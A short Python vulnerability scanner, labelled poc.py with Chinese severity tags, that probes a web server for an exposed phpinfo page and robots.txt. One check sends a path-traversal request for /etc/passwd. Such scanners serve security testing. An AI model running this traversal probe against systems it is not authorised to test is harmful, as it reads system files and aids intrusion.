# poc.py
import requests

class POCScanner:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip("/")
        self.headers = {"User-Agent": "Mozilla/5.0"}

    def check_phpinfo(self):
        target = self.base_url + "/phpinfo.php"
        try:
            r = requests.get(target, headers=self.headers, timeout=3, verify=False)
            if "phpinfo" in r.text and "PHP Version" in r.text:
                return f"[高危] phpinfo信息泄露: {target}"
        except:
            return None

    def check_robots(self):
        target = self.base_url + "/robots.txt"
        try:
            r = requests.get(target, headers=self.headers, timeout=3, verify=False)
            if r.status_code == 200 and len(r.text) > 10:
                return f"[中危] robots.txt泄露: {target}"
        except:
            return None

    def check_path_traversal(self):
        target = self.base_url + "/../../etc/passwd"
        try:
            r = requests.get(target, headers=self.headers, timeout=3, verify=False)
            if "root:x:" in r.text:
                return f"[高危] 路径遍历漏洞: {target}"
        except:
            return None